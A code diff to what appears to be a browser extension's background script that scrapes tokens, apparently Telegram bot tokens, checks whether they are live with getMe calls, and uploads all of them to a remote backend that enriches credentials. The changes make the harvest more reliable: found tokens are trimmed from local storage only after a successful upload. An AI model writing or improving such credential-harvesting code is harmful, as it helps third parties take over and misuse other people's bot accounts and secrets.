@@ -8,8 +8,8 @@ const COUNTRY_CODES = [
     "IR", "SA", "AE", "IL", "GR", "PT", "BE", "HU", "NZ"
 ];
 
-// Max tokens kept in state.results to avoid hitting the 5 MB
-// chrome.storage.local limit. Oldest entries are dropped when exceeded.
+// Target max tokens in state.results to avoid hitting the 5 MB
+// chrome.storage.local limit. Oldest entries are dropped only after upload.
 const MAX_STORED_RESULTS = 300;
 
 // Max concurrent getMe validation calls (keeps Telegram rate-limit happy)
@@ -136,14 +136,21 @@ function saveState() {
     chrome.storage.local.set({ scraper_state: storageState }, () => {
         if (chrome.runtime.lastError) {
             console.warn("[BG] saveState failed:", chrome.runtime.lastError.message);
-            // Storage full — trim results and retry once
+            // Storage full — upload before trimming results, then retry once
             if (state.results.length > 50) {
-                state.results = state.results.slice(-50);
-                const trimmed = { ...storageState, results: state.results };
-                chrome.storage.local.set({ scraper_state: trimmed }, () => {
-                    if (chrome.runtime.lastError) {
-                        console.error("[BG] saveState retry failed — state not persisted");
+                const resultsToUpload = state.results.slice();
+                uploadToSupabase({ persistState: false }).then((uploaded) => {
+                    if (!uploaded) {
+                        console.warn("[BG] saveState retry skipped — upload failed; results retained");
+                        return;
                     }
+
+                    const uploadedTokens = new Set(resultsToUpload.map((result) => result.token));
+                    const keepTokens = new Set(resultsToUpload.slice(-50).map((result) => result.token));
+                    state.results = state.results.filter((result) =>
+                        !uploadedTokens.has(result.token) || keepTokens.has(result.token)
+                    );
+                    saveState();
                 });
             }
         }
@@ -509,6 +516,26 @@ async function validateBatch(rawItems) {
 }
 
 // Handle a batch of results arriving from content.js
+async function makeRoomForResults(additionalCount) {
+    const excess = state.results.length + additionalCount - MAX_STORED_RESULTS;
+    if (excess <= 0) return;
+
+    const uploadedResults = state.results.slice();
+    const resultsToRemove = uploadedResults.slice(0, excess);
+    const uploaded = await uploadToSupabase({ persistState: false });
+    if (!uploaded) return;
+
+    const uploadedTokens = new Set(resultsToRemove.map((result) => result.token));
+    let removed = 0;
+    state.results = state.results.filter((result) => {
+        if (removed < excess && uploadedTokens.has(result.token)) {
+            removed++;
+            return false;
+        }
+        return true;
+    });
+}
+
 async function handleResults(items) {
     if (!state.isRunning && state.status !== "Paused") return;
 
@@ -521,9 +548,13 @@ async function handleResults(items) {
 
     if (newItems.length === 0) return;
 
+    const additionalCount = newItems.filter(
+        (item) => !state.results.some((result) => result.token === item.token)
+    ).length;
+    await makeRoomForResults(additionalCount);
+
     // Save raw tokens immediately before validation — survives SW death mid-batch
     for (const item of newItems) {
-        if (state.results.length >= MAX_STORED_RESULTS) state.results.shift();
         // Placeholder entry: valid=null means "found but not yet validated"
         if (!state.results.find(r => r.token === item.token)) {
             state.results.push({ ...item, valid: null });
@@ -543,8 +574,8 @@ async function handleResults(items) {
         if (existing >= 0) {
             state.results[existing] = v; // replace placeholder with full validated data
         } else {
-            // Fallback: shouldn't happen but cap and push anyway
-            if (state.results.length >= MAX_STORED_RESULTS) state.results.shift();
+            // Fallback: shouldn't happen, but still preserve the result if upload fails
+            await makeRoomForResults(1);
             state.results.push(v);
             state.resultsFound++;
         }
@@ -565,15 +596,15 @@ function broadcastState() {
 // Direct Supabase write removed — it stored raw plaintext tokens with no
 // encryption path, creating a permanent security hole in the DB.
 
-async function uploadToSupabase() {
+async function uploadToSupabase({ persistState = true } = {}) {
     // Send ALL found results — valid, invalid, and unvalidated
     // The backend re-validates via enrich_credential anyway
     const allResults = (state.results || []);
     if (allResults.length === 0) {
         state.status = "⚠️ Nothing to upload (no tokens found)";
-        saveState();
+        if (persistState) saveState();
         broadcastState();
-        return;
+        return false;
     }
 
     const cfg = await new Promise((resolve) => {
@@ -585,13 +616,13 @@ async function uploadToSupabase() {
 
     if (!apiUrl) {
         state.status = "⚠️ Upload skipped — set API URL in settings";
-        saveState();
+        if (persistState) saveState();
         broadcastState();
-        return;
+        return false;
     }
 
     state.status = `⬆️ Uploading ${allResults.length} tokens via API...`;
-    saveState();
+    if (persistState) saveState();
     broadcastState();
 
     const payload = {
@@ -618,6 +649,7 @@ async function uploadToSupabase() {
     const headers = { "Content-Type": "application/json" };
     if (monitorKey) headers["X-Monitor-Key"] = monitorKey;
 
+    let uploaded = false;
     try {
         // Retry up to 3 times with exponential backoff (network hiccups, API restart)
         let lastErr = null;
@@ -636,6 +668,7 @@ async function uploadToSupabase() {
                 if (res.ok) {
                     const data   = await res.json().catch(() => ({}));
                     state.status = `✅ Uploaded: ${data.inserted || 0} new, ${data.updated || 0} updated, ${data.skipped || 0} skipped`;
+                    uploaded = true;
                     lastErr = null;
                     break;
                 } else if (res.status >= 500) {
@@ -665,8 +698,9 @@ async function uploadToSupabase() {
         console.warn("Upload exception:", e);
     }
 
-    saveState();
+    if (persistState) saveState();
     broadcastState();
+    return uploaded;
 }
 
 // Expose for CDP automation (scripts/dev/run_fofa_scan.mjs)
